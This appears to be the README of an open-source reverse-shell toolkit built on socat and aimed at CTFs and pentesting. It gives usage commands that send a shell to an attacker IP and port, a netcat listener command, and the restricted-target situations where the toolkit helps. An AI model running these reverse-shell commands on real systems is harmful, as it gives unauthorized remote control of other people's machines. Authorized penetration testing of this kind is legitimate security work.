# Just Another Reverse Shell but Interactive (JARSI)

![JARS Banner](https://img.shields.io/badge/Reverse%20Shell-Pretty%20and%20Simple-blueviolet?style=for-the-badge&logo=gnu-bash)

A minimal, pretty, and effective reverse shell toolkit using `socat` for both shell and listener. Perfect for CTFs, pentesting, and quick remote access scenarios.

---

## 🚀 Purpose

**JARS** provides a clean and reliable way to establish reverse shells using Bash and socat. It includes:
- `revShell.sh`: Initiates a reverse shell to a remote attacker.
- `revListener.sh`: Sets up a listener to catch incoming reverse shells, and can be used to enhance the shell experience (autocompletion, arrow keys, etc.) on servers with limited command support. 

---

## 🛠️ Requirements

- [socat](http://www.dest-unreach.org/socat/)
- Bash (Linux/macOS/WSL)

Install socat (Debian/Ubuntu):
```bash
sudo apt update && sudo apt install socat
```

---

## 📦 Files

- **revShell.sh**  
  _Usage:_
  ```bash
  ./revShell.sh [Remote Attacker IP] [Remote Attacker PORT]
  ```
  _Example:_
  ```bash
  ./revShell.sh 10.10.14.1 4444
  ```

- **revListener.sh**  
  _Usage:_
  ```bash
  ./revListener.sh [Listener PORT]
  ```
  _Example:_
  ```bash
  ./revListener.sh 4444
  ```

---

## ✨ Features
- Clean output and usage instructions
- Uses `socat` for stable, interactive shells
- Minimal dependencies
- Easy to use and modify

---

## ❓ When to Use JARS
This tool is especially useful when the target system:
- Does **not** have Python installed
- Has Python, but `pty` cannot be imported (so you can't upgrade shells easily)
- Lacks typical tab completion or cannot use `stty` to fix the shell
- Does **not** have a fully functional `nc` (Netcat) command, or only provides a limited client (e.g., BusyBox's older versions)
- Presents other restrictions that prevent you from getting a stable, interactive shell

By using socat, JARS helps you get a more interactive and reliable shell in these restrictive environments.

---

## 💡 Tips
- For Windows, use WSL or a Linux VM to run these scripts.
- Make scripts executable: `chmod +x revShell.sh revListener.sh`
- Always get proper authorization before using reverse shells!
- You can also use a simple Netcat listener as an alternative:
  ```bash
  nc -lnvp [PORT]
  ```
  However, note that Netcat listeners may not provide as smooth an experience (e.g., autocompletion, arrow keys) as the provided socat-based listener.

---

## ⚠️ Disclaimer
This project is for educational and authorized penetration testing purposes only. Do **not** use it on systems you do not own or have explicit permission to test.

---

## 📚 References
- [socat documentation](http://www.dest-unreach.org/socat/doc/socat.html)
- [Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

---

Enjoy your interactive shells! 🐚✨
